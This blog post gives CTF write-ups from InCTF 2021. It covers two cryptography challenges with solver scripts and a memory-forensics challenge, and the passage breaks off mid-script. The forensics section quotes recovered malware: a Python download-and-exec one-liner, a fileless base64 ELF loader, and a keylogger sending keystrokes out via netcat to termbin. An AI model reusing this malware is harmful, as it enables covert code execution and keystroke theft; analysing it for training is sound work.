---
title: "InCTF Writeups"
date: 2021-08-15T12:33:00+02:00
draft: false
katex: true
---
This weekend, I participated a bit in [InCTF](https://ctftime.org/event/1370) with Cyberlandsholdet.
Here are some writeups for the most interesting challenges I was part of solving.
## Gold digger
```python
import random
from Crypto.Util.number import *

flag=open("flag","rb").read()

def encrypt(msg, N,x):
    msg, ciphertexts = bin(bytes_to_long(msg))[2:], []
    for i in msg:
        while True:
            r = random.randint(1, N)
            if gcd(r, N) == 1:
                bin_r = bin(r)[2:]
                c = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N
                ciphertexts.append(c)
                break
    return ciphertexts

N = 76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019

x = 72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283

flag = (encrypt(flag,N,x))

open("handout.txt","w").write("ct:"+str(flag)+"\n\nN:"+str(N)+"\n\nx:"+str(x))
```
You can get `handout.txt` [here](/files/golddigger_handout.txt).

This was a pretty fun cryptography challenge, which you can solve using some basic algebra.
This scheme encrypts a string bit by bit, producing a new number in modulo \\(N\\).
Each encrypted bit is defined by the equation:
$$ c_i \equiv x^{2r + i} r^2\ (\mathrm{mod}\ N) $$
which can be reduced to 

$$ c_i \equiv x^{r^2} x^{i} r^2\ (\mathrm{mod}\ N) $$

If you look closely at this equation, you can see that the first and third term of the product on the right-hand side are squares, and are therefore both quadratic residues. \\(x^i\\) will be \\(x\\) if \\(i=1\\), and \\(1\\) if \\(i=0\\).
Since, in modular arithmetic, multiplying two quadratic residues produces another quadratic residue, if \\(c_i\\) is a quadratic residues, then \\(i\\) must be \\(0\\), and vice versa.

Since \\(N\\) is a composite number, the way to tell whether any number modulo \\(N\\) is a quadratic residue is the Kronecker symbol.
The Kronecker symbol is in sagemath, so the solver script just looks as follows:
```python
from Crypto.Util.number import long_to_bytes

N = 76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019
x = 72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283
from handout import ct

res = ""
for c in ct:
    if kronecker_symbol(c, N) == 1:
        res += "0"
    elif kronecker_symbol(c, N) == -1:
        res += "1"
print(long_to_bytes(int(res, 2)).decode('ascii')[:-1])
```
Which prints `inctf{n0w_I_4in7_73ll1ng_u_4_g0ldd1gg3r}`.

## Easy Xchange
I was asked if I wanted to solve a Diffie-Hellman challenge. Nobody mentioned to me there would be curves involved.
Nonetheless, the challenge was to break the following encryption scheme:
```python
import os, hashlib, pickle
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

key = os.urandom(4)
FLAG = open('flag.txt', 'rb').read()
p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
a = p - 3
b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B

def gen_key(G, pvkey):
	G = sum([i*G for i in pvkey])
	return G

def encrypt(msg, key):
	key = hashlib.sha256(str(key).encode()).digest()[:16]
	cipher = AES.new(key, AES.MODE_CBC, os.urandom(16))
	return {'cip': cipher.encrypt(pad(msg, 16)).hex(), 'iv': cipher.IV.hex()}

def gen_bob_key(EC, G):
	bkey = os.urandom(4)
	B = gen_key(G, bkey)
	return B, bkey

def main():
	EC = EllipticCurve(GF(p), [a, b])
	G = EC.gens()[0]
	Bx = int(input("Enter Bob X value: "))
	By = int(input("Enter Bob Y value: "))
	B = EC(Bx, By)
	P = gen_key(G, key)
	SS = gen_key(B, key)
	cip = encrypt(FLAG, SS.xy()[0])
	cip['G'] = str(G)
	return cip

if __name__ == '__main__':
	cip = main()
	pickle.dump(cip, open('enc.pickle', 'wb'))
```
The main trouble with this cryptography scheme is the key generation.
As can be seen in the line `key = os.urandom(4)`, keys for this scheme are pretty short.
This meant that the challenge could be brute forced pretty quickly:
```python
import os, hashlib, pickle
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from tqdm import tqdm

p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
a = p - 3
b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B

cip = bytes.fromhex('9dcc2c462c7cd13d7e37898620c6cdf12c4d7b2f36673f55c0642e1e2128793676d985970f0b5024721afaaf02f2f045')
iv = bytes.fromhex('cbd6c57eac650a687a7c938d90e382aa')
E = EllipticCurve(GF(p), [a, b])
G = E((38764697308493389993546589472262590866107682806682771450105924429005322578970, 112597290425349970187225006888153254041358622497584092630146848080355182942680))
assert G == E.gens()[0]
p = G
for i in tqdm(range(2**20)):
    key = hashlib.sha256(str(p.xy()[0]).encode()).digest()[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        print(unpad(cipher.decrypt(cip), 16).decode('ascii'))
        break
    except ValueError:
        pass
    p += G
```

## The Big Score
Yup, I did a forensics challenge
> We sent Michael over to the Union Depository to collect data from one of their systems for the heist. We were able to retrieve the data, but it looks like they were able to read the message sent to us that Michael had typed from their system. Fortunately, he took the memory dump before escaping the building. Analyze the memory dump and find out how the message was compromised.

This challenge consisted of a memory dump, which was about 4GiB.
So after a some `strings`, `rg` and a lot of patience, I found this snippet:

```bash
python -c "import urllib2;exec(urllib2.urlopen('https://termbin.com/ab9v').read())"
```

At the termbin link, the following python script was located:

```python
import ctypes, os, urllib2, base64;libc = ctypes.CDLL(None);argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]));syscall = libc.syscall;fexecve = libc.fexecve;content = base64.b64decode("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CAAAAEQAAACcAAAAmP3//2UAAAAAQg4QjwJCDhiOA0UOII0EQg4ojAVIDjCGBkgOOIMHTQ5Acg44QQ4wQQ4oQg4gQg4YQg4QQg4IABAAAADkAAAAwP3//wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgBwAAAAAAACAHAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA4AUAAAAAAAANAAAAAAAAAKQIAAAAAAAAGQAAAAAAAACgDSAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAAKgNIAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAIAAAAAAAAFAAAAAAAAAKgDAAAAAAAABgAAAAAAAAC4AgAAAAAAAAoAAAAAAAAAvwAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAoA8gAAAAAAACAAAAAAAAAGAAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAgAUAAAAAAAAHAAAAAAAAAMAEAAAAAAAACAAAAAAAAADAAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAAeAAAAAAAAAAgAAAAAAAAA+///bwAAAAABAAAIAAAAAP7//28AAAAAgAQAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAABoBAAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALANIAAAAAAAAAAAAAAAAAAAAAAAAAAAABYGAAAAAAAAJgYAAAAAAAA2BgAAAAAAAEYGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBAgAAAAAABHQ0M6IChVYnVudHUgNy41LjAtM3VidW50dTF+MTguMDQpIDcuNS4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCAAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCAAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCAAAAAAAAAAAAAAAAAAAAAAAAAwAGAKgDAAAAAAAAAAAAAAAAAAAAAAAAAwAHAGgEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAJAMAEAAAAAAAAAAAAAAAAAAAAAAAAAwAKAIAFAAAAAAAAAAAAAAAAAAAAAAAAAwALAOAFAAAAAAAAAAAAAAAAAAAAAAAAAwAMAAAGAAAAAAAAAAAAAAAAAAAAAAAAAwANAFAGAAAAAAAAAAAAAAAAAAAAAAAAAwAOAGAGAAAAAAAAAAAAAAAAAAAAAAAAAwAPAKQIAAAAAAAAAAAAAAAAAAAAAAAAAwAQALAIAAAAAAAAAAAAAAAAAAAAAAAAAwARAIAJAAAAAAAAAAAAAAAAAAAAAAAAAwASAMgJAAAAAAAAAAAAAAAAAAAAAAAAAwATAKANIAAAAAAAAAAAAAAAAAAAAAAAAwAUAKgNIAAAAAAAAAAAAAAAAAAAAAAAAwAVALANIAAAAAAAAAAAAAAAAAAAAAAAAwAWAKAPIAAAAAAAAAAAAAAAAAAAAAAAAwAXAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAYABAQIAAAAAAAAAAAAAAAAAAAAAAAAwAZAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAOAJAGAAAAAAAAAAAAAAAAAAAOAAAAAgAOANAGAAAAAAAAAAAAAAAAAAAhAAAAAgAOACAHAAAAAAAAAAAAAAAAAAA3AAAAAQAYABAQIAAAAAAAAQAAAAAAAABGAAAAAQAUAKgNIAAAAAAAAAAAAAAAAABtAAAAAgAOAGAHAAAAAAAAAAAAAAAAAAB5AAAAAQATAKANIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACgAAAAAQASAOwKAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACuAAAAAAATAKgNIAAAAAAAAAAAAAAAAAC/AAAAAQAVALANIAAAAAAAAAAAAAAAAADIAAAAAAATAKANIAAAAAAAAAAAAAAAAADbAAAAAAARAIAJAAAAAAAAAAAAAAAAAADuAAAAAQAWAKAPIAAAAAAAAAAAAAAAAAAEAQAAEgAOAKAIAAAAAAAAAgAAAAAAAAAUAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAChAQAAIAAXAAAQIAAAAAAAAAAAAAAAAAAwAQAAEgAOAA0IAAAAAAAAHwAAAAAAAAA1AQAAEAAXABAQIAAAAAAAAAAAAAAAAAAOAQAAEgAPAKQIAAAAAAAAAAAAAAAAAAA8AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABYAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABsAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACAAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACfAQAAEAAXAAAQIAAAAAAAAAAAAAAAAACsAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAC7AQAAEQIXAAgQIAAAAAAAAAAAAAAAAADIAQAAEQAQALAIAAAAAAAABAAAAAAAAADXAQAAEgAOADAIAAAAAAAAZQAAAAAAAAC6AAAAEAAYABgQIAAAAAAAAAAAAAAAAAClAQAAEgAOAGAGAAAAAAAAKwAAAAAAAADnAQAAEAAYABAQIAAAAAAAAAAAAAAAAADzAQAAEgAOAGoHAAAAAAAAowAAAAAAAAD4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAAASAgAAEQIXABAQIAAAAAAAAAAAAAAAAAAeAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAA4AgAAIgAAAAAAAAAAAAAAAAAAAAAAAADhAQAAEgALAOAFAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTgAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGNoZWNrLmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAbG9vcABfZWRhdGEAX19zdGFja19jaGtfZmFpbEBAR0xJQkNfMi40AHN5c3RlbUBAR0xJQkNfMi4yLjUAcHJpbnRmQEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4yLjUAX19kYXRhX3N0YXJ0AF9fZ21vbl9zdGFydF9fAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2lzb2M5OV9zY2FuZkBAR0xJQkNfMi43AF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5keW5hbWljAC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AgAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAIAAAAAAABUAgAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCAAAAAAAAdAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAgAAAAAAAJgCAAAAAAAAHAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAuAIAAAAAAAC4AgAAAAAAAPAAAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAAAAAAAKgDAAAAAAAAqAMAAAAAAAC/AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD///9vAgAAAAAAAABoBAAAAAAAAGgEAAAAAAAAFAAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABrAAAA/v//bwIAAAAAAAAAgAQAAAAAAACABAAAAAAAAEAAAAAAAAAABgAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAegAAAAQAAAACAAAAAAAAAMAEAAAAAAAAwAQAAAAAAADAAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAACABQAAAAAAAIAFAAAAAAAAYAAAAAAAAAAFAAAAFgAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAA4AUAAAAAAADgBQAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAAAGAAAAAAAAAAYAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAABQBgAAAAAAAFAGAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACdAAAAAQAAAAYAAAAAAAAAYAYAAAAAAABgBgAAAAAAAEICAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAowAAAAEAAAAGAAAAAAAAAKQIAAAAAAAApAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAACwCAAAAAAAALAIAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACxAAAAAQAAAAIAAAAAAAAAgAkAAAAAAACACQAAAAAAAEQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAvwAAAAEAAAACAAAAAAAAAMgJAAAAAAAAyAkAAAAAAAAoAQAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMkAAAAOAAAAAwAAAAAAAACgDSAAAAAAAKANAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADVAAAADwAAAAMAAAAAAAAAqA0gAAAAAACoDQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA4QAAAAYAAAADAAAAAAAAALANIAAAAAAAsA0AAAAAAADwAQAAAAAAAAYAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJgAAAABAAAAAwAAAAAAAACgDyAAAAAAAKAPAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADqAAAAAQAAAAMAAAAAAAAAABAgAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA8AAAAAgAAAADAAAAAAAAABAQIAAAAAAAEBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAPUAAAABAAAAMAAAAAAAAAAAAAAAAAAAABAQAAAAAAAAKQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABAEAAAAAAAAEgGAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAiBYAAAAAAABUAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAANwYAAAAAAAA/gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=");fd = syscall(319, "", 1);os.write(fd, content);fexecve(fd, argv, argv)
```

The python file decodes the big chunk of base64 to an ELF file, and executes it.
If we just look for strings in the binary that has been downloaded, it's pretty simple to figure out what it does:
```
$ rabin2 -z the_binary
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000008b8 0x000008b8 30  31   .rodata ascii Create a new session ? [y/n] :
1   0x000008e0 0x000008e0 120 121  .rodata ascii git clone https://github.com/AdminRightsGuy/sus-systems.git && mv sus-systems/extract.py extract.py && python extract.py
2   0x00000960 0x00000960 31  32   .rodata ascii rm -rf  extract.py sus-systems/
```

The rabbit hole continues, as the file in the GitHub repository looks as follows:

```python
import subprocess, binascii, hashlib, random, string, time

f = open("/dev/input/event2","rb")
data = ''

rec = time.time()
while time.time() < rec+180:
	data += f.read(24)
f.close()

link = subprocess.Popen('echo {} | nc termbin.com 9999'.format(data.encode('hex')), shell=True, stdout=subprocess.PIPE).communicate()[0][20:-2]
subprocess.call(["mkdir","bin"])

g = open('bin/log','w+')
for i in range(20):
	if i !=10:
		g.write(hashlib.md5(''.join(random.sample(string.ascii_letters, 20))).hexdigest()+'\n')
	else:
		g.write(hashlib.md5(link).hexdigest()[::-1]+'\n')
g.close()
```

So what this script does is that it records some input from `/dev/input/event2`, encodes it in hex, uploads it to termbin, hashes the last part of the link, and writes it to a file (between a bunch of other, phony hashes).

The urls on termbin are simply four characters.
If we simply use all printable ASCII characters, that's a hundred million potential hashes.
In addition to that, the memory dump contains about 120.000 unique strings that could be md5 hashes.
By sorting the list of potential hashes in the memory dump, we can for every possible hash do a binary search through the hashes in the memory dump. This turns into \\(10^8 \cdot \log_2(10^5) \approx 10^9\\) comparisions, or about five minutes to find the correct hash.
```python
import string
import hashlib
import re
from tqdm import tqdm
import itertools

# stolen from https://stackoverflow.com/questions/34327244/binary-search-through-strings
def find(L, target):
    start = 0
    end = len(L) - 1

    while start <= end:
        middle = (start + end)//2
        midpoint = L[middle]
        if midpoint > target:
            end = middle - 1
        elif midpoint < target:
            start = middle + 1
        else:
            return midpoint

print("Opening file")
# the_big_score.lime.hashes found by the following command.
# You could attack the file directly, but that's very slow
# strings -n 32 the_big_score.lime | rg '[a-fA-F0-9]{32}' | sort | uniq
dump = open('the_big_score.lime.hashes', 'rb').read()

print("Finding hashes")
hashes = [x.decode('ascii') for x in re.findall(b'[a-fA-F0-9]{32}', dump)]

# Removes duplicates
hashes = sorted(list(dict.fromkeys(hashes)))
